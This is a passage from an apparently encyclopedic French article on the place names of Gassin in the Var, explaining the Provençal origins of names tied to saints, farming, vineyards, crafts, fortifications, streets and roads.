Il a donné au cours du temps son nom à diverses entités géographiques (Colle Bertaud, le chemin de Bertaud, le Carton de Bertaud, la Plaine de Bertaud), à un pin autrefois célèbre, le Pin de Bertaud, et aujourd’hui au domaine de Bertaud-Belieu, qui assure au quartier une renommée internationale grâce à la récolte annuelle de fonds organisée par la fondation DiCaprio.
Le nom provient du nom germanique "Bertoaldus", qui n’est connu ni comme prénom ni comme nom de famille dans la Presqu’île.
Noms de personnes attachés à un lieu.
Les noms de personnes, de familles ou sobriquets, sont très nombreux et fournissaient au Moyen Âge la plupart des toponymes. Beaucoup ont aujourd’hui disparu.
Nom d’origine.
Plusieurs noms évoquent l’origine : L’Arlatane, qui désigne une source et aujourd’hui des sentiers de randonnées au sud-ouest du village. Le nom vient du provençal "arlaten, arlaten", « d’Arles ». Cavaillon est ancien nom de rue et de quartier au village. Il s’agit de l’extrémité nord de l’actuelle "rue Longue". 
Élisabeth Sauze classe Bagary parmi les noms d’origine. Ce quartier au nord-est du village a également donné son nom à un chemin. Le nom est attesté et répandu comme nom de famille dans le Var et plusieurs lieux des Maures portent ce nom (Plan-de-la-Tour, Cannet-des-Maures). L’ancien nom de quartier Barbantane est également issu d’un nom de lieu de ville des Bouches-du-Rhône. 
Bestagne est un quartier boisé au nord-est du village ; son nom est également porté par deux moulins ruinés et un chemin. Médecin-Champagne, quartier au nord du village, près de la plaine, est formé du nom de lieu et du nom de métier. D’autres noms sont issus de noms de lieux selon Élisabeth Sauze : les lieux-dits oubliés des Dangers, Pournain, et le quartier de Chausse. Ce dernier est enclavé au sein de La Croix-Valmer, aux confins sud-ouest de Gassin. Il abrite le domaine de Chausse.
Hagiotoponymes et divinités.
L’empreinte de l’Église est importante dans les toponymes.
Concernant l’organisation locale des croyants, il a existé une place de la Paroisse, ou Plasse, aujourd’hui place de l’Église, devant l’église Notre-Dame-de-l’Assomption. Le petit chemin qui longe l’église au nord est le passage des Bénédictins, du nom de l’ordre monastique de Saint-Benoît.
Le symbole de la chrétienté, la croix, a été utilisé pour former deux noms de quartier aujourd’hui disparus : La Crois Pinedade et La Cros del Vintador.
Les saints.
Outre le saint patron de Gassin, saint Laurent, qui possède une rue à l’entrée nord du village, plusieurs saints catholiques sont à l’origine de toponymes à Gassin. Le saint local a donné son nom à une chapelle, un quartier, le gres de Sanct Laurens et la Vinhas de Sanct Laurens.
L’un des hagiotoponymes les plus présents célèbre le père de Jésus, saint Joseph, dont le nom a été utilisé pour une montée, un oratoire et un monument. Le Saint-Esprit a servi à nommer autrefois une rue et une place au cœur du village, aujourd’hui "rue Centrale" et "place de la Mairie". Le nom a également été utilisé pour nommer Lo Cros de Sanct Sperit. D’autres saints encore ont été toponymisés : Saint-Bonaventure pour un quartier et un chemin au nord-est de Gassin, près de Saint-Tropez, Saint Jean qui désignait un quartier, peut-être pour saint-Jean Cassien, fondateur de l’abbaye de Saint-Victor de Marseille ; le nom de Saint Julien a été utilisé pour désigner un quartier, une chapelle et un "ort" Saint Martin a été inclus dans trois toponymes : le Cros de Saint-Martin, la plaine de Saint-Martin, lo Gres de Sanct Martin.
Saint Sébastien a donné son nom à un quartier entre Gassin et Ramatuelle. Il abritait la chapelle Saint-Sébastien à la sortie du village ; le chemin qui menait depuis le bourg et la porte qu’il traversait portaient également le nom de ce martyr. Le nom de la "rue Saint-Sébastien" a été modifiée pour devenir la "rue Saint-Jean-Baptiste".
Le chemin du Puits Saint-Jean s’étend à l’extrémité sud-ouest du village. Il relie la "rue Saint-Jean-Baptiste" au mini-stade et aux "Boucles de l’Arlatane".
L’église du village est dédiée . La chapelle est, elle, dédiée à ; elle est également connue sous le nom de Notre-Dame-de-la-Consolation.
Le surnaturel.
L’ancien nom de lieu La Roqua del Folet est formé d’un nom de famille ou d'un nom commun associé à "roqua", roche. Élisabeth Sauze l’inclut dans les éléments évoquant le surnaturel. Le village de Gassin est d’ailleurs connu comme "le village des Sorcières", nom qui a donné son nom au groupe folklorique de Gassin, "Leï Masco", les "masques", les sorcières en provençal.
Déesse et dieu grec et romain.
Les Grecs fondèrent plusieurs cités et comptoirs le long de la côte méditerranéenne durant le premier millénaire avant notre ère.
Le comptoir grec d’Athénopolis, évoqué par les géographes antiques Pline l’Ancien et Pomponius Mela, est situé dans le golfe de Saint-Tropez, sans qu’à ce jour aucune découverte ne puisse déterminer précisément son emplacement. Le nom vient de la déesse grecque Athéna au nom de laquelle a été ajouté le suffixe -"polis", « cité ». Pline l’Ancien rattache cet établissement à la colonie de Marseille en l’appelant "Athenopolis Massiliensium" ; Pomponius Mela le situe entre Forum Julii (Fréjus) et Olbia (Hyères). En 2016 a été inauguré un bâtiment HLM dénommé le Neptune aux "Marines de Gassin". Il fait référence au dieu romain des Mers, Neptune. La voie privée qui y mène est l’allée du Trident, attribut de ce dieu.
Personnalités.
Les noms de personnalités ont été peu utilisés dans la politique de dénomination des rues. Sept sont recensés et tous issus de l’histoire locale, ce qui peut marquer une certaine « autocélébration ». Deux viennent de l’histoire médiévale, un de l’époque moderne et quatre de la période contemporaine. L’absence de toute référence à des personnalités et évènements d’envergure nationale est notable.
L’hommage aux soldats du 15e Corps.
Trois places publiques ont été baptisées en 2016 à Gassin. Les trois parkings à l’entrée du village ont reçu les noms de trois soldats de Gassin du XVe Corps morts durant le mois d’août 1914 : Louis Collomp, Charles Giordano et Léon Martel.
C’est durant cette période que se déroula l’affaire du XVe Corps. Alors que les Provençaux combattaient au front, le sénateur Auguste Gervais diffama les hommes du XVe Corps, suivi notamment par Georges Clemenceau, pourtant sénateur du Var.
L’inauguration des plaques de rue se déroula le 17 septembre 2016 à l’occasion des Journées du patrimoine. Elle s’inscrit dans une longue action mémorielle toponymique des autorités provençales commencée dès la fin de la Première Guerre mondiale par la mairie de Vidauban.
Le travail.
L’agriculture.
La transformation et la mise en valeur des terres par l’activité agricole, centrale dans la vie des hommes depuis toujours, a conduit à la création de nombreux noms.
L’organisation des terres.
Plusieurs noms évoquent les champs, formé avec le provençal "camp", « champ, pièce de terre » et un nom, de personne ou d’arbre : le Can d’Audran, ancien nom de lieu aujourd’hui inutilisé et Champ de l’Hormeau (voir flore). Le diminutif "camboun", « champ, petit champ cultivé », a donné Cambon, quartier situé près de Ramatuelle, et Lo Campon de Mieja Via, le champ situé au milieu du chemin (vers Ramatuelle). Les terres, le terme étant compris comme parcelle, est à l’origine de Terra Longa, ancien nom de lieu oublié qui était situé dans la plaine au nord. Il est formé à partir du provençal "terro", « terre », et de l’adjectif "lonc", « long », « de forme allongée ». La Terra del Rodel, ancien nom de lieu oublié, également connu comme l’Iera de Rudel, a été créé sur la même forme, avec le nom "rodel".
D’autres noms ont été utilisés pour les terres laissées en friche, comme Bouigue, ancien nom de lieu à l’ouest, entre "les Moulières" et "Cros de Martin". Il vient du provençal "bouïgo", « friche ». La Gastoha, ancien nom de lieu aujourd’hui oublié, sur le chemin de Saint-Tropez, est issu du provençal "gastous", de "gast", « désert, abandonné ». (Voir aussi le chapitre sol).
Le nom de la rue de l’Aire, qui relie le nouveau village depuis l’école primaire jusqu’à la "route des Moulins de Paillas", vient du provençal "iero" utilisé pour « aire à battre le blé ». Il date du début de l’extension moderne du village à la fin du . Le terme désignait auparavant des étendues planes sans discrimination d’utilisation et a servi dans le passé à plusieurs toponymes aujourd’hui disparus : en l’Iera del Grec, l’Iera de Montanier, l’Iera de Rudel. Il a existé également le quartier des Aires Communes, aujourd’hui oublié, dans le "quartier de Saint-Sébastien", au sud du village ; il désignait une aire à battre le blé publique. Un grand projet d’aménagement du quartier de la rue de l’Aire a été annoncé au début de 2017.
Les cultures dans les terres provençales accidentées sont propices à la culture en terrasse. Plusieurs toponymes en témoignent, comme Las Terrieras, ancien nom de lieu oublié, identifié dans le quartier de la Rouillère, issu du provençal "terrier", « terrasse, tertre ». Le Sentier des Restanques est un nom de chemin de randonnée dans les "Boucles de l’Arlatane". Il vient du provençal "restanca", à l’origine utilisé pour désigner des ouvrages de canalisation des eaux pour les cultures, ici dans son sens actuel de murs de soutènement en pierre sèche. Il existe également un passage des Restanques, au nord-est du nouveau village.
Le maraîchage.
Les abords du village ont été utilisés pour le maraîchage. Le lieu-dit du Grand Jardin, aujourd’hui oublié, venait du provençal "jardin", avec l’adjectif "grand". Il désignait probablement une parcelle destinée à la culture maraîchère. Plusieurs noms de lieux ont été formés autour du provençal "ort", « jardin » ; tous ont aujourd’hui disparu. Trois étaient formés avec des noms : l’Ort Caminier, avec le sobriquet "caminié," « voyageur, batteur d’estrade, vagabond », l’Ort de Caravilha, avec le sobriquet "caravilho," "«" chicane, tromperie, querelle », et l’Ort de Sanct Jolian, dans le "quartier de Saint-Julien." Avec le suffixe "-as", il a donné également le quartier des Ortas, aujourd’hui oublié.
Au nord du village existait le lieu-dit Les Ferrais, près de l’actuel cimetière. Le nom vient du provençal "farrajo," dans le sens de « jardin » selon É. Sauze ; F. Mistral donne « fourrage en vert, terrain en fourrage ». Le nom de lieu Favegranade, qui désignait une terre située entre "Cambon" et le "Broc", vient du provençal "favo", « fève » et du participe passé et adjectif "granat", "-ado", « fève grenue » ou « fève montée en graine ».
Les vergers.
La culture des arbres fruitiers est ancienne à Gassin. Certaines espèces cultivées, comme les mûriers au , n’ont cependant pas laissé de trace en toponymie. Lo Vergier de Rastim, ancien nom de lieu oublié, du provençal "vergier", « verger », avec le nom "Rastim" (?), évoque directement la forme de culture. Les autres font référence aux arbres élevés. 
Seuls deux noms sont toujours utilisés aujourd’hui : Grafionier et Caruby. Le premier est un quartier au sud-ouest de la commune, près de "Bagaréde" ; son nom vient du provençal "grafiounié", « bigareautier », qui désigne une espèce de cerisier. Il enclavé à l’intérieur de La Croix-Valmer, était autrefois organisé autour d’une bastide isolée près du "Bourrian". Il accueille aujourd’hui notamment un village de vacances d’Air France. Caruby est un quartier à l’ouest du village, au nord de la "Mort du Luc" ; le nom a été formé avec le provençal "carroubié", « caroubier », arbre cultivé pour son bois, ses fruits et ses graines. Sa culture dut être importante dans ce secteur puisqu’un quartier voisin à Cogolin s’appelle "Caroubier". 
La Carte de Cassini donne le nom des Orangers à un quartier situé entre Ville Vieille et Bélieu ; son nom est issu du provençal "arangié", « oranger ». 
Le nom de l’Amendier Tort, ancien lieu-dit aujourd’hui oublié, sur l’ancien chemin de Grimaud, désignait un amandier isolé, arbre répandu en Provence, du provençal "amendié", avec l’adjectif "tort", « tortueux ». La Figuiera de Pueygros était un nom de lieu dans le quartier de "Pueygros" ; son nom vient du provençal "figuié", figuier, avec le nom du quartier "Pueygros" (voir relief). Le nom du lieu-dit aujourd’hui oublié Piras Gibbose, qui se trouvait dans le quartier de Saint-Martin, a un nom dérivé du provençal "pira", « poire ».
La vigne.
La vigne demeure depuis plusieurs siècles l’une des principales activités agricoles de Gassin.
Elle est à l’origine de plusieurs noms de lieux dont La Vignus, quartier et route (également connue comme la route départementale 89) au nord-ouest du village. Le nom vient du provençal "vigno", « vigne, champ de vigne ».
Les autres sont d’anciens noms de quartier aujourd’hui oubliés : La Vinha de Brunel, dans le secteur des Moulières, avec le nom de personne Brunel, La Vinha de Tassil, avec le nom de famille Tassil, et Las Vinhas de Sanct Laurens, dans le quartier de Saint-Laurent, au sud-ouest, avec le nom du saint-patron de Gassin. Ce lieu-dit se trouvait à proximité de la chapelle Saint-Laurent.
Il existe au village une rue de la Treille, dont le nom renvoie à une maison où se trouve toujours aujourd’hui une vigne élevée en treille.
Les animaux.
La basse-cour a laissé peu de toponymes. Le Capon désignait autrefois le sud-est du village. Son nom vient du provençal "capoun", « chapon, coq châtré ». La rue du Capon est aujourd’hui le haut de la "rue de la Calade". Élisabeth Sauze propose comme explication pour la Torre del Torhel, ancien nom de lieu vers Saint-Tropez aujourd’hui oublié, le provençal "torre", « tour », compris comme pigeonnier.
La plupart des toponymes issus du bestiaire sont liés à l’élevage ovin et caprin, plus pour désigner les abris que les bêtes. L’ancien nom de lieu l’Iera del Grec est issu du provençal "grec, grei", « troupeau ». Trois noms sont issus du provençal "boual", « étable à bœufs », dont seul le premier, Boual, est toujours utilisé aujourd’hui. Il s’agit d’un quartier situé au nord du Défend des Bœufs, sur la colline qui accueille le village. Les deux autres étaient la Boal de la Verne et la Boal dels Gonties, construits avec les noms géographique et de personne. Le Jas des Moullieres, ancien nom de lieu aujourd’hui oublié, du provençal "jas", désignait un « bercail, [une] bergerie, [une] cabane où l’on enferme les troupeaux ».
L’ancien nom de lieu aujourd’hui inusité, Los Abeurados, vient du provençal "abéuradou", signifiant « abreuvoir ».
L’élevage caprin a donné La Cabriere, nom de lieu aujourd’hui oublié, entre Gassin et Ramatuelle, formé du provençal "cabriero", « lieu fréquenté par les chèvres, étable ou parc à chèvres ».
De très nombreux lieux ont été nommés d’après un prè, du provençal "prat", généralement associé à son propriétaire au temps où le nom s’est fixé. Ils marquent l'état de la répartition de propriété foncière lors de leur formation. Tous les toponymes connus sont d’anciens noms de quartier aujourd’hui inconnus, situés dans les plaines : Pré Glaude, entre la Vernatelle et Verdagne, Le Pré Martel, entre Bélieu et le ruisseau du Bourrian, Lo Prat de Salamon, sur l’ancien chemin de La Môle ; le Pré Marty, entre les quartiers des Jonquières et du Plan, ou avec des adjectifs : Prat Lonc, du provençal "lonc", « long » ; Pré Fonterau, avec le provençal "soteiran", « inférieur, bas », dont le nom est devenu incompris et a été modifié. Il faut encore ajouter Le Paty, lieu-dit au sud du village, du provençal "pati", « pâtis, terrain de vaine pâture, pacage ; quartier affecté au logement des troupeaux, place où l’on fait reposer le bétail, où on laisse croître l’herbe ».
Parfois, c’est l’interdiction faite aux animaux d’être sur une terre qui est à l’origine d’un nom. C’est le cas du Défend des Bœufs, quartier sis entre le Bourrian et la colline de Ville Vieille. Son nom vient de l’ancien français "défens", qui désignait un bois ou un pâturage à l’accès réglementé, associé ici aux bœufs.
L’élevage des abeilles est à l’origine d’un ancien nom de lieu, L’Apier, aujourd’hui oublié, issu du provençal "apié", « ruche », « rucher ».
La pêche.
L’activité de la pêche est restée à Gassin artisanale avant de disparaître en tant qu’activité économique. Elle n’a laissé qu’un témoignage : celui de La Bouillabaisse, nom de rivière et de quartier à la frontière entre Gassin et Saint-Tropez. La rivière a pris le nom du quartier où elle se jette dans le Golfe.
Elle était autrefois connue comme le "real de Gassin".
L’artisanat et l’industrie.
Le massif des Maures et ses nombreux chênes lièges en firent la capitale des bouchons. Plusieurs unités de production existèrent à Gassin ; elles étaient encore cinq à la fin du alors que cette industrie déclinait, notamment sous son format artisanal. La rue des Bouchonniers dans le village ancien, derrière les restaurants de la place des Barris, rappelle l’importance qu’eut la bouchonnerie.
La rue des Fabriques est une rue de l’ancien village à la dénomination moderne. Une autre rue du village, la Montée de la Tubassière, qui permet de descendre de la "rue Centrale" à la "rue Longue", s’inscrit dans ce registre. Elle doit son nom au provençal "tubassiero", « brouillard de fumée […], maison où il fume toujours ».
Les moulins furent un élément essentiel de la vie économique et de la survie. Il exista au cours du temps différents moulins à Gassin, à vent, à eau, à sang, pour produire du blé et de l’huile. Ils ont donné plusieurs toponymes : Le Moulin et Les Mollins, d’autres associés à des noms de personnes et de lieux (lo Molin Aurier, Lo Molin Rodier, lo Molin dels Benes, le Moulin Brûlât, le Moulin de Verdagne, le Moullin du Paty, les Moulins de Bestagne), d’autres caractérisant leur fonctionnement (le Mollin de l’Eau, le Moulin d’Eau, la rue du Moulin à huile) ou leur âge (l’Aire du Moulin Vieux). Élisabeth Sauze en rapproche également le nom Lo Bessalh.
Grâce à la farine des moulins, les habitants pouvaient confectionner du pain, aliment de base de la nourriture autrefois. Ils utilisaient pour cela les fours, ce qui a donné la rue du Four, au village. D’autre fours ont existé comme le Four à Chaux, qui fut autrefois un lieu-dit.
Les métiers de la tannerie ont conduit à l’invention de trois noms de quartiers, qui ont tous disparu. Les lavoirs, où étaient traitées les plantes, ont donné le Lavadou et lo Lavador. Le lieu-dit Qualquier, du provençal "cauquiero", caractérisait un réservoir utilisé pour la tannerie.
La Tuilière est un quartier entre la Gare et Saint-Laurent, à l’ouest du village, dont le nom provençal, "touliera", signifie « tuilerie ».
L’installation d’une usine de torpilles de la société de Robert Whitehead, l’inventeur de la torpille sous-marine automobile, a enrichi Gassin d’un nouveau toponyme, Les Torpilles. Ce lieu-dit se situe au nord de Gassin, dans le quartier Bertaud. Après sa nationalisation en 1937, l’usine a été dirigée par le groupe DCNS qui, après un peu plus de 100 ans de présence, a annoncé en 2016 vouloir se séparer du site.
L’exploitation des bois a donné deux toponymes : Carbonel, du provençal "carboun", « charbon », possiblement d’un nom de famille, et Rebois, quartier dont le nom est lié au travail du bois selon Élisabeth Sauze.
L’argent.
Le commerce est à l’origine d’un nom de rue au village, la Rue du Marquât, qui désignait le marché. Elle a été remplacée par la "rue Centrale".
La rue de la Tasco, au village, a remplacé la "rue du Fort". Elle fait référence à la tasque, impôt qui était prélevé sur une partie des récoltes.
Noms de métiers.
Plusieurs noms de lieux font référence à un métier, possiblement via un nom de personne : Barbarie (« boutique ou métier de barbier »), Barbeyrolle, Berbeguier, Médecin-Champagne, Lo Cros de Mege et Lo Vallon de Mege. L’ancien nom de lieu La Palissade avait trait à la marine selon Élisabeth Sauze.
Le labeur quotidien.
Le Sentier des Bugadières et la Traverse des Bugadières sont deux chemins au sud du nouveau village. Le premier fait partie des sentiers de randonnée des "Boucles de l’Arlatane". Le nom, donné à la fin du , désigne les lavandières ; il mène à un petit lavoir. Le second conduit du nouveau village au sentier.
Habitat et constructions.
Le fort médiéval.
Il reste peu de toponymes des anciens habitats. Le caractère médiéval du village apparaît dans de nombreux noms.
Le mot provençal "barri", « rempart, muraille, fortification », a donné plusieurs noms toujours usités aujourd’hui. Au village, la place deï Barri, connue comme "la place des Restaurants", est une promenade longeant les remparts médiévaux à l’extérieur avec un panorama variant du golfe de Saint-Tropez au nord à la baie de Cavalaire et aux Îles d’Or au sud. Au , le cadastre évoque les "barris vieulx", près de l’église ; il s’agit des premières fortifications, les autres étant plus tardifs. Le Barry était un ancien nom de lieu. 
Le premier quartier au nord-est du village se nomme Tras-Barry ; un chemin porte également ce nom. Il a été formé à partir de "barri", avec "tras" , « derrière ». 
Ce nom a par ailleurs donné deux autres noms, dont le lieu-dit des Barri de Gassin au sud-est. C’est le plus haut point de Gassin, culminant à 322 mètres. Un oppidum y existait autrefois ; les vestiges ont été détruits pour la construction d’antennes dépendant aujourd’hui du ministère de l’Écologie, de l’Énergie, du Développement durable et de l’Aménagement du territoire. Le lieu est dit le Radio-Phare aujourd’hui. Lou Barri de Chauvin est un quartier à l’est du village, formé avec le nom de personne Chauvin.
Le nom du fort médiéval se maintenait dans le nom de quartier du Fort, au coeur du village médiéval de Gassin. Il a donné "la rue du Fort", qui se trouvait auparavant à l’actuelle "rue de la Tasco".
Les portes.
L’entrée à travers les fortifications était permise grâce aux portes. Il n’y en avait qu’une seule au Moyen Âge, connue aujourd’hui comme la "porte des Sarrazins". Au fur et à mesure de l’extension du village et de l’apaisement des temps, les portes sont devenues plus nombreuses. Une entrée a été créée dans les remparts au milieu du au nord ; elle reçut le nom de Portail Neuf ou Porte Neuve. Elle se trouvait sur les lieux de l’actuelle rue du Portail neuf.
Le Grand Portail, également dénommé le Portail real, permettait l’accès ouest du village dans les remparts. Un quartier a porté autrefois le nom de Quartier de la Grande Porte.
Les faubourgs et au-delà.
Avec l’extension du village, de nouveaux quartiers se sont créés durant l’époque moderne. Ils ont été créés en fonction de leur positionnement par rapport au village. Le Bourg, ancien nom de quartier aujourd’hui oublié, désignait les faubourgs dans la partie ouest du village autrefois hors des murs d’enceinte ; il s’agit du mot provençal "bourg", mot utilisé pour désigner les faubourgs. Un autre nom de quartier existait, "La Borgada", La Bourgade, où se trouvaient les maisons riches du village hors du fort, de "bourgado", faubourg. 
Le quartier de Carteyron, essentiellement composé de vignobles, se situe à l’ouest du village, au sud de la route de la Vignus. Son nom vient du provençal "quarteiroun, carteyron", « quart de livre, quartier d’une chose » ; nom de famille provençal. Plusieurs autres noms de quartiers, aujourd’hui oubliés, ont été formés autour de l’idée de quartier. Le Cartier Neuf, Le Cartier Souteiran, avec le mot "souteiran", souterrain, et Le Carton de Bertaud, ce dernier avec le mot provençal "quartoun", "carton" : « quartier » associé au nom Bertaud. Il existait autrefois le lieu-dit du Clos de Dessous Ville , au nom transparent, et Lo Rial de las Partidas. 
Au nord du village se trouve le quartier de Ville Vieille, qui est également le nom d’un chemin qui suit la crête de la colline où se trouve le village. Il pourrait indiquer la direction de l’habitat médiéval, le lieu d’mplantation du "Bourrian". Un acte notarial de 1646 évoque cependant « lou fort dict la ville vieilhe » pour désigner le quartier du Fort au village. Le nom vient du provençal "vilo", ville et "vieio", vieille. Le moulin Brûlat est parfois appelé le moulin de Ville Vieille.
L’ancien lieu-dit du Pilon évoque selon Élisabeth Sauze une limite. Pilon est également utilisé pour les rochers en forme d’obélisque, sens retenu par Marianne Mullon pour Vidauban. 
L’habitat isolé.
L’habitat dispersé est à l’origine de plusieurs toponymes. C’est le cas pour les lieux-dits de La Font del Castel, le Castelas ou de La Citadelle, nom de quartier toujours usité au nord du village. Près de là se trouve le lieu-dit de la Grande Bastide au nord-est du village, près de Bertaud. Son nom est formé du provençal "bastido", « bastide, maison de campagne, ferme, villa » et de l’adjectif « grande ».
Le souvenir de constructions plus modestes, voire ruinées, perdure ou perdurait dans les toponymes. C’est le cas de l’Antigalho del Gorc Benet, ancien nom de lieu inusité, dans le quartier de Gourbenet, dont le nom vient du provençal "anticaio", « antiquaille ». Le mot provençal "casau", « masure, bâtiment ruiné », de l’ancien provençal "casals", a donné plusieurs toponymes, tous oubliés : Los Casals, lo Casal de Autrano, lo Casai de Caravilha, lo Casai de la Gastoa.
Le nom du lieu-dit des Pâris au nord-ouest, entre Cogolin, Mourteiret et Longagne, vient de "pares", du provençal "parect", « paroi, mur ». Les découvertes archéologiques attestent l’existence d’un habitat gallo-romain dans ce secteur.
Le nom de Regon des Villettes, formé avec l’ancien provençal "vileta", diminutif de "vila", « ferme, maison de campagne », et "regoun", « petit ruisseau », quartier au nord-est de Gassin, a fini par être incompris. Il est devenu aujourd’hui Rogon de la Valette. (Voir parmi les hydronymes "Rogon de la Valette".)
Seigneurs et communauté médiévale.
L’organisation féodale puis monarchique a laissé des traces en toponymie. 
Les défens désignent des parcelles dont l’accès était réglementé, pour la chasse ou la pâture. Il existe toujours aujourd’hui au nord-ouest du village le Défens des Bœufs. D’autres lieux-dits ont porté ce nom : Le Grant Devens, avec l’adjectif grand, Lo Devens de Sanct Julian, avec le nom de saint, ainsi que Deffensonum et Lo Devenset. Ces toponymes figurent la répartition sociale de la terre au moment de leur création.
Deux autres toponymes sont classés par Élisabeth Sauze à la communauté médiévale :
Le Passage des Templiers se trouve dans la partie ouest du village. Son nom d’appellation récente évoque une hypothétique présence templière à Gassin.
La Porte des Sarrazins marque l’entrée du fort médiéval primitif. Divers noms sont associés aux Sarrasins en Provence, dont une "porte Sarrazine" dans le village voisin de Ramatuelle, d’autres au-delà comme à Montbrison, Saint-Julien-en-Beauchêne ou Marmande.
Œuvres publiques et sociales.
Il a existé un « ospital » au moins dès le début du à Gassin. Il se trouvait dans le quartier de Cavaillon et a ensuite été supplanté par un second au cours de ce même siècle. Il a été utilisé comme nom de quartier aujourd’hui oublié.
Les institutions publiques sont à l’origine de plusieurs noms. La place de la Mairie est l’ancienne place du Saint-Esprit. Elle se trouve au cœur du village, devant le bâtiment qui abrite la mairie depuis le et qui a également servi d’école.
La Rue des Écoles est une voie du nouveau village qui commence au nord-ouest devant l’école primaire et la crèche du village pour aller au sud-est vers l’école maternelle, L’Espelidou. Ce dernier nom est un mot provençal signifiant « lieu d’éclosion, où l’on fait éclore ».
Voies de communication et de télécommunication.
Les rues du village.
L’Androuno.
La commune de Gassin s’enorgueillit de posséder la « plus petite rue du monde », l’Androuno. Elle est devenue pour cela une curiosité touristique. À son écartement minimum en largeur, elle mesure 29 centimètres.
Le terme vient du latin "andron", dérivé du grec "ἀνδρών", hommes. Il désignait chez les Grecs une partie des habitations réservée aux hommes. Pour Vitruve et Pline le Jeune, le nom caractérisait un passage entre deux maisons ou entre deux parties d’une même maison. Une autre source évoque une racine sanscrite.
Le terme est attesté depuis longtemps et figure dans les glossaires et dictionnaires depuis le . Frédéric Mistral, dans son "Tresor dòu Felibrige", donne comme définition de ce mot, pouvant également s’écrire "endrouno" (a), "androuio" (dans le pays niçois), "androun" (languedoc) ou "androne" dans le bordelais, une « "ruelle" », un « "cul-de-sac" », un « "vide qui sépare deux maisons" », ou le « "tour de l’échelle" », pouvant encore évoquer un réduit, une cachette ou des latrines.
L’androuno peut donc être une ruelle étroite et peu engageante, et de ce fait réservée aux hommes. C’est la théorie évoquée par le chanoine François Durand. Selon Claude-François Achard, l’androuno est une « ruelle, endroit propre à se cacher ».
Constante de l’architecture des villages méditerranéens, ces « passages couverts fournissent d’efficaces remparts contre les assauts du mistral, la canicule estivale, les giboulées printanières ou les averses de neige ». Aujourd’hui, plusieurs fonctions plus ou moins fantaisistes lui sont attribuées : utilisation dans le comptage, voire la sélection selon leur grosseur, de moutons, permettre l’écoulement des eaux lors des violents orages ou empêcher la venue d’hommes en arme.
Les voies anciennes.
Le cadastre de 1691 donnait neuf noms de rue au village, qui ont tous disparus aujourd’hui : la Rue de Cavaillon (Carrière de Cavalhon en 1575), la rue du Bourg et la Rue Droite, anciennement en provençal "Carriera Recta", respectivement parties nord, centrale et sud de l’actuelle rue Longue, la rue du Four, remplacée par la "rue du Vieux-Puits", la place Neuve, actuelle "place de l’Église" (une nouvelle place Neuve se trouve désormais à l’ouest du village), la rue du Marquat, devenue "rue Centrale", la rue du Fort, devenue "rue de la Tasco" - la rue du Fort remplaçant alors le Passage -, la place du Saint-Esprit, où se trouve désormais la place de la Mairie et la rue du Capon : ancien , qui est désormais la "rue de la Calade". D’autres noms apparaissent comme la Carriere romaine, reliant la place Neuve à la rue Droite. Le cadastre de 1643 évoquait également le Cartier de la carrière droite.
Le cadastre de 1575 donne le camin alant a Nostre-Dame, camin allant a St Troppes, camin allant a Cogollin.
Les rues d’aujourd’hui.
La dénomination officielle des voies du village a été tardive. Elle a parfois repris l’usage ("place de l’Église, place du Portail Neuf"), parfois innové ("rue du Troubadour Rollet de Garcin").
La plupart des toponymes sont étudiés par ailleurs. Ce n’est pas le cas de celles dont le nom est lié lui-même à l’usage des rues.
C’est le cas de la rue Rompe-Cuou le caractère potentiellement accidentogène pour les piétons descendant cette voie accidentée a imposé ce nom (provençal mais largement compréhensible en français). Il existait autrefois une "place Neuve", devenue "place de l’Église". L’actuelle Place Neuve a été dénommée ainsi depuis le . Malgré son nom de "place", elle est utilisée essentiellement comme route, dans la continuité de la "montée Ven Terraou" et de la "rue Saint-Jean-Baptiste".
Les voies extérieures.
Les voies anciennes.
Les archives anciennes donnent peu de nom de voies de communication hors du village. Les noms de ces chemins étaient fonction de leur destination : camin alant a Nostre-Dame, camin allant a St Troppes, camin allant a Cogollin. D’autres noms ont existé : Las Calrieras del Plan, du provençal "carrieras" rue, et "plan", plaine qui n’est pas localisé, et Lo Campon de Mieja Via, nom ancien du quartier "Cambon", qui rappelait autrefois son équidistance entre Gassin et Ramatuelle, formé avec le mot provençal "cambon", « champ, petit champ cultivé » et "mei" « demi » associé à via, « chemin », la moitié du chemin.
Gués et ponts.
L’abondance de ruisseaux et rivières, souvent éphémères, explique les nombreux toponymes évoquant les moyens de franchir ces passages délicats, ouvragés ou non. Plusieurs lieux-dits, aujourd’hui oubliés, étaient formés avec le mot provençal "pas", gué, passage, associé soit à des noms, de personne ou d’objet géographique, soit à des adjectifs. Le Mal Pas était un gué sur l’ancien "chemin du Plan" ; il permettait de passer le ruisseau descendant du "Cros de Martin" (avec "mal", mauvais). Le Pas de Carbounnel se trouvait sur le chemin allant du village au hameau de Barbeyrolles et servait à traverser la Berle ; le Pas de Domeniguin servait à passer le ruisseau de la source de l’Arlatane (ces deux noms étant avec les noms de personne). Le Pas de la Berle, qui se trouvait dans le quartier de Bonne Fontaine, permettait également d’enjamber la Berle.
Lo Regon del Pontilhal est un ancien nom de lieu aujourd’hui inconnu, constitué du provençal "regon", « petit ruisseau » et "pontilhal", diminutif de "pont", « petit pont, ponceau ».
Les grandes voies de communication.
Gassin s’est trouvé à l’écart des grandes voies de communication romaine, situation qui a perduré durant le Moyen Âge et durant les siècles suivants. Les efforts réalisés sous le empire ont permis un certain désenclavement routier.
Plusieurs routes sont considérées comme ayant un intérêt dépassant ceux du seul village : elles ont été nommées au cours du temps routes impériales, royales ou nationales avant de devenir des routes départementales.
Les routes départementales apparaissent dans l’histoire au début du . Comme les départements, dont elles tirent leur nom du verbe latin "departir", « partager », issus de la Révolution française qui divisa la France ainsi. Le mot « route » pourrait venir du latin "rupta", « voie rompue », de "rumpere", « briser ». Une autre hypothèse est une origine celte, "rhod", retrouvée dans l’irlandais "rót", l’écossais "rhawd".
Les routes départementales ont été organisées à la fin de l’Empire avec deux décrets de 1811 et 1813. Elles étaient déjà sous la responsabilité des autorités départementales.
Voies avec indication géographique extérieure.
Historiquement, plusieurs voies étaient appelées par la destination qu’elles permettaient de rallier : "camin de Saint-Tropez", "camin de Cogollin", etc. Aujourd’hui encore, la RD 98 est appelée "route de Saint-Tropez".
La Route des Moulins de Paillas est le nom donné à une route moderne qui permet de contourner le village pour rejoindre le croisement entre la RD 89 et le chemin vicinal numéro 1 dit de Coste Brigade et Ramatuelle via les moulins de Paillas, situés à Ramatuelle.
La Place des Îles d’Or se situe à l’extrémité sud de l’ancien village. Elle a été dénommée ainsi en raison de la vue qu’elle offre sur les Îles d’Hyères.
La gare.
